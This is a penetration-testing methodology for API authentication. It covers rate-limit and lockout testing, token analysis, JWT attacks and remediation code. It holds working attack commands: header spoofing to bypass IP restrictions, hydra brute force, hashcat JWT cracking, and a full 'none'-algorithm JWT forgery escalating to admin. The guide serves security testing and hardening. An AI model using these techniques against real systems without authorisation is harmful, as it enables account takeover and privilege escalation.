# Authentication

## What is API Authentication?

API authentication is the mechanism that verifies the identity of clients attempting to access API endpoints. It ensures that only authorized users or systems can interact with the API resources. Secure API authentication is critical for protecting sensitive data and functionality, as weaknesses can lead to account takeovers, privilege escalation, and unauthorized access to API resources. This methodology examines various API authentication methods and their security implications.

## Key Questions to Answer

- Are API authentication mechanisms resistant to brute force and credential stuffing attacks?
- Are API tokens and keys generated securely and handled properly?
- Can token-based API authentication be bypassed or manipulated?
- Are API sessions managed securely throughout their lifecycle?
- Can API authentication flows be circumvented through logical flaws?

## Detailed API Authentication Security Methodology

### 1. API Authentication Mechanism Identification

#### 1.1 Identify API Authentication Types

- Map all authentication mechanisms used in the API:
    - API key authentication
    - Bearer token authentication
    - JWT-based authentication
    - HMAC authentication
    - Certificate-based authentication
    - Basic authentication
    - Custom authentication schemes

#### 1.2 Map API Authentication Flows

- Document the complete authentication process:
    - Initial authentication endpoints
    - Token/session issuance
    - Token refresh mechanisms
    - Password reset flows
    - Account recovery processes
    - Registration processes
    - MFA enrollment and verification

#### 1.3 Identify API Authentication Components

- Document where authentication data is stored:
    - Headers (e.g., `Authorization`, `X-API-Key`)
    - Cookies
    - Request body
    - URL parameters
    - Custom headers

### 2. Brute Force Protection Testing

#### 2.1 Rate Limiting Assessment

- Test login endpoints for rate limiting:
    - Attempt multiple failed logins (10-20) with the same username
    - Attempt logins with different usernames from the same IP
    - Use tools like Burp Intruder with incrementing payloads
    - Check for timing differences in responses
    - Document the threshold at which rate limiting begins

```bash
# Example of a bash script to test rate limiting
for i in {1..50}; do
  echo "Attempt $i"
  curl -X POST https://example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"wrongpassword123"}' \
    -w "Status: %{http_code}, Time: %{time_total}s\n" -o /dev/null -s
  sleep 1
done
```

#### 2.2 Account Lockout Testing

- Test for account lockout mechanisms:
    - Attempt multiple failed logins to a test account
    - Try to access the account after the lockout threshold
    - Document the number of attempts before lockout
    - Check if lockout is time-based or requires admin intervention
    - Test if account lockout affects only the specific user or IP
    - Check if lockout can be bypassed by using different authentication methods

#### 2.3 CAPTCHA and Challenge Response Testing

- If CAPTCHA is implemented:
    - Check if CAPTCHA can be bypassed by removing parameters
    - Test if CAPTCHA is required only after suspicious activity
    - Check if CAPTCHA validation happens server-side
    - Test if CAPTCHA tokens can be reused

#### 2.4 IP-based Restrictions Testing

- Test if IP-based restrictions are properly enforced:
    - Use proxies to attempt authentication from different IPs
    - Check if geolocation restrictions work as expected
    - Test if IP restrictions can be bypassed with headers:
        
        ```
        X-Forwarded-For: 127.0.0.1X-Real-IP: 192.168.1.1Client-IP: 10.0.0.1
        ```
        

### 3. Credential Testing

#### 3.1 Password Policy Assessment

- Test password policy enforcement:
    - Minimum length requirements
    - Complexity requirements (uppercase, lowercase, numbers, special characters)
    - Common password rejection
    - Password history enforcement
    - Test if policy is enforced client-side only or server-side

#### 3.2 Username Enumeration Testing

- Check for username enumeration vulnerabilities:
    - Compare error messages for existing vs. non-existing usernames
    - Check for timing differences in responses
    - Test registration process for existing username errors
    - Test password reset functionality for username validation
    - Check if email addresses can be enumerated

#### 3.3 Credential Transmission Testing

- Verify secure transmission of credentials:
    - Check if HTTPS is enforced for all authentication endpoints
    - Verify certificate validity and strength
    - Check for sensitive data in URL parameters
    - Test if credentials are transmitted in request body rather than URL
    - Check if credentials are logged in server logs or client consoles

### 4. Token Analysis

#### 4.1 Token Generation Analysis

- Gather multiple authentication tokens for analysis:
    - Collect 100+ tokens by authenticating multiple times
    - Use Burp Suite Sequencer to analyze token randomness:
        - Overall quality assessment
        - Character-level entropy
        - Predictability testing
    - Save tokens to a file for further analysis

```bash
# Example of collecting tokens using curl
for i in {1..100}; do
  curl -X POST https://example.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"testuser","password":"correctpassword"}' | \
    jq -r '.token' >> tokens.txt
  
  # Logout if necessary to invalidate the session
  # curl -X POST https://example.com/api/logout...
  
  sleep 1
done

# Basic analysis of collected tokens
echo "Total tokens: $(wc -l tokens.txt)"
echo "Unique tokens: $(sort tokens.txt | uniq | wc -l)"
echo "First few tokens:"
head -n 5 tokens.txt
```

#### 4.2 Token Structure Analysis

- Analyze token structure and encoding:
    - Determine if tokens are encoded (Base64, Hex, etc.)
    - Decode tokens to analyze internal structure:
        
        ```bash
        # Base64 decoding exampleecho -n 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIn0.kAV_4GnM_rZBu1W4K1iJmCQdju-cqQOOt-9x2I_Xvms' | base64 -d
        ```
        
    - Check if tokens contain sensitive information
    - Identify if tokens have expiration times
    - Look for patterns that might indicate weak generation

#### 4.3 Token Handling Tests

- Test how the application handles tokens:
    - Check if tokens are stored securely (HttpOnly, Secure flags for cookies)
    - Test if tokens are transmitted over secure channels
    - Check if tokens are vulnerable to XSS (client-side storage)
    - Test token lifetime and expiration handling
    - Check if logout properly invalidates tokens
    - Test if tokens are revoked after password changes

### 5. JWT-specific Testing

#### 5.1 JWT Structure Analysis

- Analyze JWT components:
    - Header: Algorithm and token type
    - Payload: Claims (standard and custom)
    - Signature: Verification mechanism
- Use tools to decode JWTs:
    - jwt.io website
    - `jq` for parsing JSON after base64 decoding:
        
        ```bash
        # Decode JWT headerecho -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d | jq .# Decode JWT payloadecho -n 'eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzQxMTgwOTM3fQ' | base64 -d | jq .
        ```
        

#### 5.2 JWT Signature Verification Testing

- Test if the server properly validates JWT signatures:
    - Modify the payload without updating the signature
    - Use 'none' algorithm attack:
        
        ```
        # Original{  "alg": "HS256",  "typ": "JWT"}# Modified{  "alg": "none",  "typ": "JWT"}
        ```
        
    - Test for algorithm confusion attacks (RS256 to HS256)
    - Use tools like `jwt_tool` to automate testing:
        
        ```bash
        # Test for 'none' algorithm vulnerabilityjwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzQxMTgwOTM3fQ.lWXErjU2OR0g4k8Yn2g7ItE0k6br0T0ZNAQiURkvzKc -X a# Test all JWT attacksjwt_tool -t https://example.com/api/protected -rh 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzQxMTgwOTM3fQ.lWXErjU2OR0g4k8Yn2g7ItE0k6br0T0ZNAQiURkvzKc' -M at
        ```
        

#### 5.3 JWT Secret Strength Testing

- Test for weak JWT signing secrets:
    - Use `hashcat` to attempt cracking the signature:
        
        ```bash
        # Mode 16500 is for JWThashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNzQxMTgwOTM3fQ.lWXErjU2OR0g4k8Yn2g7ItE0k6br0T0ZNAQiURkvzKc rockyou.txt
        ```
        
    - Try common secrets like "secret", "password", API names, company names
    - If successful, create new tokens with elevated privileges

#### 5.4 JWT Claim Testing

- Test manipulation of JWT claims:
    - Modify standard claims (sub, iss, exp, nbf, iat, jti)
    - Test for JWT replay attacks (use expired tokens)
    - Check if critical claims are properly validated
    - Test for privilege escalation by modifying role/group claims:
        
        ```
        # Original payload{  "userid": "user",  "role": "user",  "iat": 1741180937}# Modified payload{  "userid": "user",  "role": "admin",  "iat": 1741180937}
        ```
        

### 6. Session Management Testing

#### 7.1 Session Creation Analysis

- Analyze how sessions are created after authentication:
    - Check if session tokens are generated with sufficient entropy
    - Test if new sessions are created after authentication
    - Check if old sessions are invalidated after re-authentication

#### 7.2 Session Lifecycle Testing

- Test session timeout and expiration:
    - Check for both idle and absolute timeouts
    - Test behavior after timeout (graceful expiration)
    - Test if cookies have proper Expires/Max-Age attributes

#### 7.3 Session Termination Testing

- Test session termination functionality:
    - Verify that logout properly invalidates sessions
    - Check if sessions are invalidated server-side, not just client-side
    - Test if session termination works across multiple devices
    - Test behavior after password change or reset

### 7. Authentication Logic Flaws Testing

#### 9.1 Authentication Flow Testing

- Test for logical flaws in authentication flows:
    - Check for authentication bypasses in multi-step processes
    - Test if steps can be skipped or performed out of order
    - Look for race conditions that might bypass authentication

#### 9.2 Account Recovery Testing

- Test security of account recovery mechanisms:
    - Analyze password reset functionality
    - Check security questions for predictability
    - Test email-based recovery for vulnerabilities
    - Check if recovery mechanisms can be abused for account takeover

#### 9.3 Business Logic Bypass Testing

- Test for business logic flaws in authentication:
    - Check for alternate authentication paths
    - Test for privilege escalation after authentication
    - Check if authentication state can be transferred between accounts
    - Test boundary conditions (timing issues, edge cases)

### 8. API Key Authentication Testing

#### 10.1 API Key Storage and Transmission

- Test how API keys are stored and transmitted:
    - Check if keys are transmitted over secure channels
    - Verify that keys are not exposed in client-side code
    - Check for API key leakage in HTTP referrer headers
    - Verify keys are not logged in server logs

#### 10.2 API Key Generation and Rotation

- Test API key security practices:
    - Analyze API key entropy and structure
    - Check if API keys can be rotated/regenerated
    - Test if old API keys are properly invalidated
    - Check how API key revocation is handled

#### 10.3 API Key Permission Testing

- Test if API keys have appropriate permissions:
    - Check for principle of least privilege
    - Test if scoped API keys respect their limitations
    - Check if API keys with different permissions work as expected

## Exploitation & Reporting

### Exploitation Templates

#### Brute Force Attack

```bash
# Using hydra for password brute force
hydra -l admin -P passwords.txt example.com http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"

# Using Burp Intruder
# 1. Capture login request
# 2. Send to Intruder
# 3. Set payload position on password field
# 4. Use password list
# 5. Set appropriate grep match for success/failure
```

#### JWT Signature Bypass

```bash
# Original JWT
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NDExODA5Mzd9.8FYMxQ3L_LhjdZ0CXnLHJ9ZQN0rply6uBTHtJ_IcaS4

# Decode header
echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo -n 'eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NDExODA5Mzd9' | base64 -d
# {"userid":"user","role":"user","iat":1741180937}

# Modify payload to escalate privileges
echo -n '{"userid":"user","role":"admin","iat":1741180937}' | base64 | tr -d '=' | tr '/+' '_-'
# eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQxMTgwOTM3fQ

# Modify header to use 'none' algorithm
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Create modified JWT (without signature for 'none' algorithm)
modified_jwt="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyaWQiOiJ1c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzQxMTgwOTM3fQ."

# Test with curl
curl -i https://example.com/api/admin -H "Authorization: Bearer $modified_jwt"
```

### Impact Assessment

For each authentication vulnerability, assess the impact:

|Impact Level|Description|Example|
|---|---|---|
|Critical|Complete authentication bypass or system compromise|JWT signature validation bypass, master password/key discovery|
|High|Account takeovers or significant privilege escalation|Weak token generation, password reset flaws|
|Medium|Enumeration vulnerabilities or limited access|Username enumeration, MFA bypass for non-critical functions|
|Low|Information disclosure about authentication mechanisms|Verbose error messages, token format disclosure|

### Reporting Template

For each API authentication vulnerability found:

1. **Vulnerability Title**: Clear description of the vulnerability
2. **Affected Component**: The specific authentication mechanism affected
3. **Vulnerability Description**: Technical explanation of the authentication weakness
4. **Reproduction Steps**:
    - Detailed step-by-step instructions
    - Sample requests and responses
    - Tools used and commands executed
5. **Impact**: Description of what an attacker could achieve
6. **Remediation**:
    - Specific recommendations for fixing the authentication issue
    - Industry best practices reference
    - Code examples where applicable

## Remediation Guidance

### Brute Force Protection

```javascript
// Node.js/Express rate limiting example
const rateLimit = require("express-rate-limit");

// Create rate limiter middleware
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: "Too many login attempts, please try again after 15 minutes",
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    // Use both IP and username to prevent username enumeration
    return `${req.ip}_${req.body.username}`;
  }
});

// Apply to login route
app.post("/api/login", loginLimiter, (req, res) => {
  // Login logic
});
```

### Secure JWT Implementation

```javascript
// Node.js JWT implementation with best practices
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Generate a strong secret
const secret = crypto.randomBytes(64).toString('hex');

// Create a token with appropriate claims
function createToken(user) {
  return jwt.sign(
    {
      sub: user.id,
      username: user.username,
      role: user.role,
    },
    secret,
    {
      algorithm: 'HS256',
      expiresIn: '1h',     // Short expiration time
      notBefore: 0,        // Valid immediately
      issuer: 'api.example.com',
      audience: 'example.com',
      jwtid: crypto.randomBytes(16).toString('hex') // Unique token ID
    }
  );
}

// Verify token with all checks
function verifyToken(token) {
  try {
    return jwt.verify(token, secret, {
      algorithms: ['HS256'], // Explicitly specify algorithms
      issuer: 'api.example.com',
      audience: 'example.com',
      complete: true // Get decoded header and payload
    });
  } catch (err) {
    console.error('Token verification failed:', err.message);
    return null;
  }
}
```

### Secure Password Handling

```python
# Python with Flask and proper password handling
from flask import Flask, request, jsonify
import secrets
import argon2

app = Flask(__name__)
ph = argon2.PasswordHasher()

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Validate password strength
    if len(password) < 12:
        return jsonify({"error": "Password must be at least 12 characters"}), 400
    
    # Check against common passwords
    with open('common_passwords.txt', 'r') as f:
        if password.lower() in f.read():
            return jsonify({"error": "Password is too common"}), 400
    
    # Hash with Argon2id (memory-hard algorithm)
    password_hash = ph.hash(password)
    
    # Save user to database (implementation not shown)
    # save_user(username, password_hash)
    
    return jsonify({"message": "User registered successfully"}), 201

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Get user from database (implementation not shown)
    # user = get_user(username)
    user = {"username": "test", "password_hash": ph.hash("securepassword")}
    
    if not user:
        # Use constant time comparison and generic message
        # to prevent username enumeration
        return jsonify({"error": "Invalid credentials"}), 401
    
    try:
        # Verify password with constant time comparison
        ph.verify(user['password_hash'], password)
        
        # Generate secure session token (implementation not shown)
        token = secrets.token_hex(32)
        
        return jsonify({"token": token}), 200
    except argon2.exceptions.VerifyMismatchError:
        return jsonify({"error": "Invalid credentials"}), 401
```

## Tools for API Authentication Security Assessment

- **Burp Suite**: Proxy, repeater, intruder, and sequencer
- **OWASP ZAP**: Proxy and automated scanner
- **JWT_Tool**: Comprehensive JWT testing
- **Hydra/Medusa**: Brute force testing
- **Hashcat**: Password cracking
- **Postman**: API testing
- **OAUTH Tools**: OAuth 2.0 testing suite
- **MFA-Bypass**: MFA testing toolkit
- **JWT Decoder**: Online and offline JWT token analysis

## API Authentication Security Cheatsheet

1. **Map all API authentication mechanisms and flows**
2. **Test for brute force protection and rate limiting in API endpoints**
3. **Analyze API token generation for randomness and security**
4. **Test JWT signature verification and algorithm handling in API contexts**
5. **Test API token lifecycle management**
6. **Test for logical flaws in API authentication processes**
7. **Assess API key management practices**
8. **Document all findings with clear exploitation paths and API security impact assessment**